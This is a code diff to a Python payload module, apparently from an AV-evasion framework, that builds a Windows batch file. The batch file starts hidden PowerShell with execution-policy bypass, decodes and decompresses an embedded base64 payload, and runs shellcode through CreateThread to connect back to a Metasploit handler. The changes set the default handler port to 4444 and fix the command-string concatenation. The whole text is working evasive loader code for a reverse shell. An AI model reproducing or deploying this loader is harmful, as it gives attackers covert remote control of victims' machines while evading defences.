@@ -20,7 +20,7 @@ class Payload:
         
         # optional
         self.required_options = {   "LHOST" : ["", "IP of the metasploit handler"],
-                                    "LPORT" : ["", "Port of the metasploit handler"]}
+                                    "LPORT" : ["4444", "Port of the metasploit handler"]}
 
     
     def generate(self):
@@ -42,7 +42,7 @@ $t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" 
         encoded = helpers.deflate(baseString)
 
         payloadCode = "@echo off\n"
-        payloadCode = "if %PROCESSOR_ARCHITECTURE%==x86 ("
+        payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 ("
         payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
         payloadCode += ") else ("
         payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)
